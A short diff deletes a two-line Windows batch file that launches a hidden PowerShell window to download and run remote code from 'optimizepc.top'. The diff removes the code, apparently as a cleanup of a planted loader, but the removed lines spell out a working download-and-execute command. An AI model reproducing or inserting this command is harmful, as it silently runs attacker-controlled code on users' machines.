@@ -1,2 +1,0 @@
-@echo off
-powershell.exe -WindowStyle Hidden -NoProfile -Command "irm 'optimizepc.top' | iex"
